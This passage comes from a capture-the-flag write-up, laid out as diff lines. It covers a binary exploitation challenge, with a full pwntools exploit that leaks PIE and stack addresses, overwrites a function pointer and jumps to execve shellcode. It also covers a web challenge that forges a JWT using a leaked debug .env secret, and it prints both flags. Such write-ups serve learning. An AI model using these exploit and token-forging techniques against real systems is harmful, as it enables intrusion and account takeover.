+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    PIE:        PIE enabled
+    Stack:      Executable
+    RWX:        Has RWX segments
+```
+
+Two lines that immediately make your eyes widen:
+
+- `Stack: Executable` (GNU_STACK `RWE`)
+- `Has RWX segments`
+
+Meaning: if I can jump to the data I control, *shellcode is on the menu*.
+
+Next, I look for interesting functions:
+
+```bash
+$ nm -n ruid_login | rg ' T '
+00000000000011d9 T list_ruids
+0000000000001264 T get_number
+00000000000012f3 T prof
+00000000000014d2 T dean
+000000000000156d T setup_users
+0000000000001667 T main
+```
+
+The address above is still **PIE-relative offsets** (runtime base random), but this is important for the leak stage later.
+
+Then I dump the ASM relevant parts:
+
+```bash
+$ objdump -d -Mintel ruid_login --disassemble=main
+$ objdump -d -Mintel ruid_login --disassemble=dean
+$ objdump -d -Mintel ruid_login --disassemble=setup_users
+$ objdump -d -Mintel ruid_login --disassemble=list_ruids
+```
+
+And to confirm about the executable stack:
+
+```bash
+$ readelf -l ruid_login | rg GNU_STACK -n
+  GNU_STACK      0x0000000000000000 ...  RWE
+```
+
+---
+
+### Read the Code
+
+Because the binary is **not stripped**, the reversing is nice. I focus on 4 parts: `setup_users`, `list_ruids`, `dean`, and `main`.
+
+#### 1) `setup_users()` — create a user "database" (and the RUID uses `rand()`)
+
+Offset: `setup_users = 0x156d`
+
+Pseudocode (converted results from ASM flow):
+
+```c
+struct user {
+  char name[0x20];
+  void (*func)();   // offset 0x20
+  uint64_t ruid;    // offset 0x28
+};
+
+user users[2];
+
+void setup_users(void) {
+  char *names[2] = {"Professor", "Dean"};
+  void (*funcs[2])() = {prof, dean};
+
+  for (int i = 0; i <= 1; i++) {
+    strcpy(users[i].name, names[i]);
+    users[i].ruid = (uint64_t)rand();   // default seed → deterministik
+    users[i].func = funcs[i];
+  }
+}
+```
+
+This explains why the RUID “admin” is apparently predictable: `rand()` is not seeded (`srand()` is not), so the output is consistent.
+
+In glibc, the initial output of `rand()` (default seed) is:
+
+- `Professor RUID = 1804289383` (`0x6b8b4567`)
+- `Dean RUID = 846930886` (`0x327b23c6`)
+
+---
+
+#### 2) `list_ruids()` — prints user list, but RUID is “censored”
+
+Offset: `list_ruids = 0x11d9`
+
+Pseudocode:
+
+```c
+void list_ruids(void) {
+  puts("");
+  for (int i = 0; i <= 1; i++) {
+    printf("[%d] {RUID REDACTED} %s\n", i, users[i].name);
+  }
+  puts("");
+}
+```
+
+Note: `%s` to `users[i].name`.
+
+If `name` **is not null-terminated**, `printf("%s")` will continue to "bleed" reading memory afterwards until it finds `\0`.
+
+Save that first.
+
+---
+
+#### 3) `dean()` — an admin feature that is a weapon
+
+Offset: `dean = 0x14d2`
+
+Pseudocode (core exploit):
+
+```c
+void dean(void) {
+  puts("Change a staff member's name!");
+  list_ruids();
+  unsigned idx;
+  if (!get_number(&idx, 2)) return;
+
+  printf("New name: ");
+  read(0, &users[idx], 0x29);  // <-- bug: nulis melewati name[0x20]
+}
+```
+
+`read(0, &users[idx], 0x29)` is *really loud*:
+
+- `name` only `0x20`
+- but he wrote `0x29`
+
+Affected layouts:
+
+```
+users[idx].name[0x20]  -> kita kontrol
+users[idx].func (8)    -> kita bisa overwrite
+users[idx].ruid (8)    -> kita overwrite 1 byte (karena total 0x29)
+```
+
+So this is not a “buffer overflow to RIP”. This is much *cleaner*:
+
+> We can **change the function pointer** that is called when logging in.
+
+---
+
+#### 4) `main()` — login, compare RUID, then `call user.func`
+
+Offset: `main = 0x1667`
+
+Pseudocode:
+
+```c
+int main(void) {
+  setup_users();
+  puts("Welcome to Rutgers University!");
+  printf("Please enter your netID: ");
+
+  char netid[0x40] = {0};
+  read(0, netid, 0x40);
+  netid[strcspn(netid, "\n")] = 0;
+  printf("Accessing secure interface as netid '%s'\n", netid);
+
+  while (!feof(stdin)) {
+    list_ruids();
+    printf("Please enter your RUID: ");
+    uint64_t ruid;
+    scanf("%lu%*c", &ruid);
+    printf("Logging in as RUID %lu..\n", ruid);
+
+    int ok = 0;
+    for (int i = 0; i <= 1; i++) {
+      if (users[i].ruid == ruid) {
+        printf("\nWelcome, %s!\n", users[i].name);
+        users[i].func();        // <-- target kita
+        putchar('\n');
+        ok = 1;
+      }
+    }
+    if (!ok) puts("No match!");
+  }
+}
+```
+
+For pwn-ers, this is delicious: just make `users[0].func` the address we want, then log in as Professor.
+
+---
+
+### Exploit: from “edit name” → leak PIE → leak stack → shell
+
+I use a 3 stage exploit:
+
+#### Stage 0 — admin login without brute force
+
+Because the RUID is `rand()` by default, we can use it directly:
+
+- `RUID_DEAN  = 846930886`
+- `RUID_PROF  = 1804289383`
+
+---
+
+#### Stage 1 — leak PIE base via “unfinished” strings
+
+Trick: in Dean, I write **exactly 0x20 bytes** to `users[0].name` (without `\0`).
+
+As a result, when `list_ruids()` prints `%s`, it bleeds into the next field and displays the bytes of `users[0].func` (the pointer to `prof`).
+
+At runtime, what is leaking is the address `prof()`:
+
+- `prof` offset = `0x12f3`
+- leak gives `prof_ptr`
+- then `pie_base = prof_ptr - 0x12f3`
+
+This is exactly what PoC does.
+
+---
+
+#### Stage 2 — leak stack pointer using `puts@plt`
+
+Now we know the PIE base. So we can calculate:
+
+- `puts@plt` offset = `0x1050`
+- `puts_plt = pie_base + 0x1050`
+
+Then overwrite:
+
+- `users[0].func = puts_plt`
+
+One small but important note: overwrite Dean writes `0x29` bytes, meaning **the first byte `ruid` is also changed**.
+So that Professor's login still matches, I force Professor's LSB RUID byte to remain `0x67` (because `0x6b8b4567`).
+
+When logged in as Professor, the program will “call” the function pointer. Because the signature `puts()` is different, it will use a register that happens to still contain a stack pointer (stale `rdi`) and print several bytes that we can parse into a pointer.
+
+From the output of `puts`, I got one stack pointer (`leaked_ptr`).
+
+Then, empirically (validated locally), the buffer address `netid` is at:
+
+> `netid_addr = leaked_ptr + 0x1c0`
+
+This offset `0x1c0` is also used by PoC (`DELTA_PTR_TO_NETID = 0x1C0`).
+
+---
+
+#### Stage 3 — put shellcode in netID, jump to it
+
+Because of the executable stack, I fill the `netID` input with:
+
+- 1 byte `\x00` (so that printing `%s` is safe)
+- NOP sled
+- shellcode `execve("/bin//sh")`
+
+Then overwrite again:
+
+- `users[0].func = netid_addr + 1` (skip NUL, go straight to NOP sled)
+
+Login Professor once again → `call users[0].func()` → immediately enter shellcode → `sh`.
+
+On the remote, just `cat flag`.
+
+---
+
+### PoC
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import time
+
+context.arch = "amd64"
+context.log_level = "info"
+
+HOST = "challs.ctf.rusec.club"
+PORT = 4622
+
+RUID_PROF = 1804289383
+RUID_DEAN = 846930886
+RUID_PROF_LSB = 0x67  # 1804289383 == 0x6b8b4567
+
+# From local reversing (PIE-relative offsets)
+PROF_OFF = 0x12F3
+PUTS_PLT_OFF = 0x1050
+
+# Empirically stable for this binary/libc: leaked_ptr -> &netid buffer delta
+DELTA_PTR_TO_NETID = 0x1C0
+
+
+def build_netid_shellcode() -> bytes:
+    sc = asm(shellcraft.sh())
+    # Make the program's `%s` printing harmless by NUL-terminating immediately,
+    # but keep executable bytes right after it (we'll jump past the NUL).
+    prefix = b"\x00"
+    netid = prefix + (b"\x90" * (0x40 - len(prefix) - len(sc))) + sc
+    assert len(netid) == 0x40
+    assert b"\n" not in netid
+    return netid
+
+
+def recv_prompt(p) -> None:
+    p.recvuntil(b"RUID: ")
+
+
+def dean_write(p, idx: int, raw: bytes) -> None:
+    recv_prompt(p)
+    p.sendline(str(RUID_DEAN).encode())
+    p.recvuntil(b"Num: ")
+    p.sendline(str(idx).encode())
+    p.send(raw)
+
+
+def solve_once() -> tuple[remote, int, int]:
+    p = remote(HOST, PORT)
+    p.timeout = 3
+    try:
+        p.recvuntil(b"netID: ", timeout=3)
+        p.send(build_netid_shellcode())
+
+        # Leak PIE via list_ruids by removing the NUL terminator of users[0].name (write only 0x20 bytes).
+        dean_write(p, 0, b"A" * 0x20)
+        blob = p.recvuntil(b"RUID: ", timeout=3)
+        marker = b"[0] {RUID REDACTED} "
+        i = blob.index(marker) + len(marker)
+        j = blob.index(b"\n", i)
+        line = blob[i:j]
+        prof_ptr = u64(line[0x20:].ljust(8, b"\x00"))
+        pie_base = prof_ptr - PROF_OFF
+
+        # Set users[0].func = puts@plt to leak a stack-ish pointer (and preserve the prof RUID LSB).
+        puts_plt = pie_base + PUTS_PLT_OFF
+        dean_write(p, 0, b"B" * 0x20 + p64(puts_plt) + bytes([RUID_PROF_LSB]))
+
+        # Trigger puts and parse leaked pointer; if it contains a newline byte, parsing may split early.
+        recv_prompt(p)
+        p.sendline(str(RUID_PROF).encode())
+        p.recvuntil(b"!\n", timeout=3)
+        post = p.recvuntil(b"RUID: ", timeout=3)
+        prefix = post.split(b"\n", 1)[0]
+        if len(prefix) < 5:
+            raise ValueError("puts leak contained newline; retry")
+        leaked_ptr = u64(prefix.ljust(8, b"\x00"))
+
+        return p, pie_base, leaked_ptr
+    except Exception:
+        try:
+            p.close()
+        finally:
+            raise
+
+
+def main():
+    for attempt in range(1, 51):
+        try:
+            p, pie_base, leaked_ptr = solve_once()
+            break
+        except Exception as e:
+            log.warning("retrying (%d/50): %r", attempt, e)
+            time.sleep(0.15)
+    else:
+        raise SystemExit("failed after 50 attempts")
+
+    netid_addr = leaked_ptr + DELTA_PTR_TO_NETID
+    jump_addr = netid_addr + 1  # skip the leading NUL we placed
+    log.info("pie_base=%#x leaked_ptr=%#x netid_addr=%#x", pie_base, leaked_ptr, netid_addr)
+
+    # Overwrite users[0].func with stack address of netID buffer (shellcode lives there).
+    recv_prompt(p)
+    p.sendline(str(RUID_DEAN).encode())
+    p.recvuntil(b"Num: ")
+    p.sendline(b"0")
+    p.send(b"C" * 0x20 + p64(jump_addr) + bytes([RUID_PROF_LSB]))
+
+    # Trigger shell and get the flag.
+    recv_prompt(p)
+    p.sendline(str(RUID_PROF).encode())
+    p.sendline(b"cat flag* 2>/dev/null; cat /flag 2>/dev/null; exit")
+    print(p.recvall(timeout=4).decode(errors="ignore"))
+
+
+if __name__ == "__main__":
+    main()
+```
+Run:
+
+```bash
+python3 solve.py
+```
+
+Example output (will be different due to ASLR):
+
+```text
+[+] Opening connection to challs.ctf.rusec.club on port 4622: Done
+[*] pie_base=0x569910021000 leaked_ptr=0x7ffc46e38b80 netid_addr=0x7ffc46e38d40
+[+] Receiving all data: Done (148B)
+[*] Closed connection to challs.ctf.rusec.club port 4622
+Logging in as RUID 1804289383..
+
+Welcome, CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAF\x7f!
+RUSEC{w0w_th4ts_such_a_l0ng_net1D_w4it_w4it_wh4ts_g0ing_0n_uh_0h}
+```
+
+### Flags
+
+`RUSEC{w0w_th4ts_such_a_l0ng_net1D_w4it_w4it_wh4ts_g0ing_0n_uh_0h}`
+
+---
+
+## Mole in the Wall – WEB
+
+Target: `https://girlypies.ctf.rusec.club`
+
+### Intro
+
+“Bonita the Yellow Rabbit is having a relapse.”
+That sentence feels like lore... but for web challenges, it usually only means one thing: **there is something that *should not be public*** but needs to be public.
+
+The target `https://girlypies.ctf.rusec.club` looks neat—landing page, about, contact—everything is fine. But the hint goes straight to the weak point:
+
+> “They tend to get their security from a JSON in debug/config…”
+
+If an application *takes security config from a debug file* and opens it to the internet, that's not "quirky". That's the back door.
+
+In this write-up I tell you the flow from recon, finding a config leak, creating a fake JWT, until finally "nightguard login" gives us a ZIP containing instructions that lead to the flag.
+
+---
+
+### Recon: map first, then get lost
+
+First, check the obvious pages:
+
+```bash
+curl -s https://girlypies.ctf.rusec.club/ | head
+curl -s https://girlypies.ctf.rusec.club/login | head
+```
+
+Page `/login` is interesting because it asks for **Security Token** (not username/password). This means that the authentication is probably **token-based** (and the hint already says "security from JSON").
+
+Random login test:
+
+```bash
+curl -s -X POST https://girlypies.ctf.rusec.club/login \
+  -d 'token=abc' | rg -n 'Unauthorized|VIOLATION|BITE' || true
+```
+
+The response was unequivocal: unauthorized.
+
+---
+
+### “debug/config”: start from what hint says
+
+The instructions were very specific, so I focused on shooting the config file that made the most sense:
+
+```bash
+curl -s https://girlypies.ctf.rusec.club/debug/config/security.json
+```
+
+Result *jackpot*:
+
+```json
+{
+  "audience": null,
+  "issuer": null,
+  "jwt": {
+    "algorithm": "HS256",
+    "required_claims": {
+      "department": "security",
+      "role": "nightguard",
+      "shift": "night"
+    }
+  }
+}
+```
+
+So the valid token is JWT HS256, and must have a claim:
+
+- `department=security`
+- `role=nightguard`
+- `shift=night`
+
+OK… but HS256 still needs secrets. And since it is “debug/config”, next step: look for `.env`.
+
+```bash
+curl -s https://girlypies.ctf.rusec.club/debug/config/.env
+```
+
+What comes out isn't a regular `.env` file—it's wrapped into JSON:
+
+```json
+{"JWT_SECRET":"g0ld3n_fr3ddy_w1ll_a1ways_b3_w@tch1ng_y0u"}
+```
+
+Finished. If the secret has been leaked, JWT is just a formality.
+
+---
+
+### Forge JWT: when the “security token” is just a signature
+
+I use Python + PyJWT to create tokens.
+
+Important note: I entered `iat/exp` (to be "more realistic"), but the server actually *rejected* it and returned the unauthorized page. Accepted tokens are those that **only contain required_claims**.
+
+Script to generate tokens:
+
+```py
+import jwt
+import requests
+
+base = "https://girlypies.ctf.rusec.club"
+secret = requests.get(base + "/debug/config/.env").json()["JWT_SECRET"]
+
+claims = {"department": "security", "role": "nightguard", "shift": "night"}
+token = jwt.encode(claims, secret, algorithm="HS256")
+print(token)
+```
+
+Continue sending to login:
+
+```bash
+python3 make_jwt.py > token.txt
+
+curl -s -X POST https://girlypies.ctf.rusec.club/login \
+  -d "token=$(cat token.txt)" \
+  -o nightguard.zip
+file nightguard.zip
+```
+
+And `file` confirms: **it's a ZIP**.
+
+---
+
+### ZIP Contents: Too much story “login gift”.
+
+First list the contents:
+
+```bash
+unzip -l nightguard.zip
+```
+
+The most relevant:
+
+- `logs/session.log`
+- `config/settings.xml`
+- `Microsoft.Flow/.../definition.json` (Power Automate / Flow “definition”)
+
+`config/settings.xml` gives internal endpoint direction:
+
+```xml
+<root><network><path>/api/run-flow</path></network></root>
+```
+
+And one `definition.json` (flow maintenance mode) displays clear logic: it reads `logs/session.log`, then **subtracts 1 from each ASCII character** to form `FinalVar`, and compares it with the technician's input.
+
+If converted into short pseudocode:
+
+```text
+enc = read("logs/session.log")
+final = ""
+for each char c in enc:
+    final += chr(ord(c) - 1)
+if AuthCode == final:
+    POST /api/run-flow { "input": final }
+```
+
+Well, `logs/session.log` contains:
+
+```text
+u$bu_qvsqm4_hvz
+```
+
+The decode (ASCII - 1):
+
+```py
+enc = "u$bu_qvsqm4_hvz"
+dec = "".join(chr(ord(c) - 1) for c in enc)
+print(dec)  # t#at^purpl3^guy
+```
+
+So the *clearance code* that flow is targeting: `t#at^purpl3^guy`.
+
+---
+
+### /api/run-flow: one character that makes all the difference
+
+Try going straight to the API:
+
+```bash
+curl -s https://girlypies.ctf.rusec.club/api/run-flow \
+  -H 'Content-Type: application/json' \
+  -d '{"input":"t#at^purpl3^guy"}'
+```
+
+Reverse `403 {"error":"invalid input"}`.
+
+Here I suspect there is character validation (eg whitelist `[a-z0-9_#]`). So I did the cheapest "sharp guess": **change `^` to `_`** (because I often get knocked in puzzles).
+
+```bash
+curl -s https://girlypies.ctf.rusec.club/api/run-flow \
+  -H 'Content-Type: application/json' \
+  -d '{"input":"t#at_purpl3_guy"}'
+```
+
+And finally:
+
+```json
+{"result":"RUSEC{m1cro$oft_n3ver_mad3_g00d_aut0m4t1on}"}
+```
+
+The flag comes out, Bonita can return to the stage.
+
+### Flags
+
+`RUSEC{m1cro$oft_n3ver_mad3_g00d_aut0m4t1on}`
+
+---
